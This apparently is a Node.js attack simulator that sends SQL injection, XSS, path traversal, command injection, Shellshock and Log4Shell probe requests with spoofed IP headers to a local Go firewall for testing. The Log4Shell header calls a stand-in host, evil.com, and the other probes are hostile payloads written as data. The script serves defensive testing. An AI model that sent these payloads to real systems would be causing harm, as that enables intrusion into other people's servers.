const http = require('http');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const defaultAttackers = [
    { ip: '47.252.4.54', type: 'SQL Injection', payload: { username: "' OR 1=1 --", password: "password" }, path: '/products' },
    { ip: '103.255.129.252', type: 'XSS', path: '/products?name=' + encodeURIComponent('<script>alert("XSS")</script>') },
    { ip: '74.125.102.8', type: 'Path Traversal', path: '/products?name=' + encodeURIComponent('../../etc/passwd') },
    { ip: '100.26.1.2', type: 'Command Injection', path: '/products?name=' + encodeURIComponent(';ls -la') },
    { ip: '5.180.181.232', type: 'Malicious User-Agent', path: '/products', userAgent: 'sqlmap/1.4.7' },
    { ip: '93.174.95.106', type: 'Log4Shell', path: '/products', headers: { 'User-Agent': '${jndi:ldap://evil.com/x}' } },
    { ip: '88.135.73.15', type: 'Shellshock', path: '/products', headers: { 'User-Agent': '() { :; }; echo "VULN"' } },
    { ip: '66.240.205.34', type: 'Generic RCE', path: '/products?name=' + encodeURIComponent('base64_decode("evil")') },
    { ip: '192.168.1.105', type: 'Local Probe', path: '/products/admin' },
    { ip: '203.0.113.42', type: 'Brute Force', payload: { user: "admin", pass: "123456" }, path: '/products/login' }
];

// Target Configuration (Golang Backend)
const TARGET_HOST = 'localhost';
const TARGET_PORT = 7129;

const simulateAttack = (target, customIP = null) => {
    const spoofIP = customIP || target.ip;
    const isPost = !!target.payload;

    const options = {
        hostname: TARGET_HOST,
        port: TARGET_PORT,
        path: target.path,
        method: isPost ? 'POST' : 'GET',
        headers: {
            'x-simulated-ip': spoofIP,
            'X-Forwarded-For': spoofIP,
            'User-Agent': target.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SimulationTool/1.0'
        }
    };

    if (target.headers) {
        Object.assign(options.headers, target.headers);
    }

    if (isPost) {
        options.headers['Content-Type'] = 'application/json';
    }

    const req = http.request(options, (res) => {
        console.log(`[${spoofIP}] [${target.type}] Sent to :${TARGET_PORT}${target.path}. Status: ${res.statusCode}`);
        res.on('data', () => { });
    });

    req.on('error', (e) => {
        console.error(`[${spoofIP}] Failed: ${e.message} (Is Go Server running on :${TARGET_PORT}?)`);
    });

    if (isPost) {
        req.write(JSON.stringify(target.payload));
    }
    req.end();
};

function runDefault() {
    console.log(`\n🚀 Launching Default Multi-Vector Attack Simulation against Go WAF (:8080)...`);
    defaultAttackers.forEach((target, index) => {
        setTimeout(() => {
            simulateAttack(target);
        }, index * 800);
    });
    setTimeout(() => {
        console.log("\n✅ Simulation Complete. Check Dashboard Map & Logs.");
        rl.close();
    }, defaultAttackers.length * 800 + 1000);
}

function runCustom() {
    rl.question('\n🎯 Enter Custom IP Address to spoof (e.g. 1.2.3.4): ', (ip) => {
        const targetIP = ip.replace(/[^\d.]/g, '').trim();

        if (!targetIP) {
            console.log("❌ Invalid IP format.");
            rl.close();
            return;
        }

        console.log(`\n🔥 Launching Full Scale Attack from [${targetIP}]...`);
        defaultAttackers.forEach((target, index) => {
            setTimeout(() => {
                simulateAttack(target, targetIP);
            }, index * 500);
        });

        setTimeout(() => {
            console.log("\n✅ Custom Attack Complete. Check Dashboard map/logs.");
            rl.close();
        }, defaultAttackers.length * 500 + 1000);
    });
}

function showMenu() {
    console.clear();
    console.log(`
    ██╗    ██╗  █████╗ ███████╗ [GOLANG TARGET]
    ██║    ██║ ██╔══██╗██╔════╝ 
    ██║ █╗ ██║ ███████║█████╗   PORT: ${TARGET_PORT}
    ██║███╗██║ ██╔══██║██╔══╝   
    ╚███╔███╔╝ ██║  ██║██║      
     ╚══╝╚══╝  ╚═╝  ╚═╝╚═╝      
    
    [ Interactive Attack Simulator ]
    `);
    console.log("1. 🌍  Default Simulation (10+ IPs, Mixed Vectors)");
    console.log("2. 🎯  Custom IP Attack (Your IP, All Types)");
    console.log("0. ❌  Exit");

    rl.question('\nSelect Option: ', (choice) => {
        if (choice === '1') runDefault();
        else if (choice === '2') runCustom();
        else {
            console.log("Exiting...");
            rl.close();
        }
    });
}

showMenu();
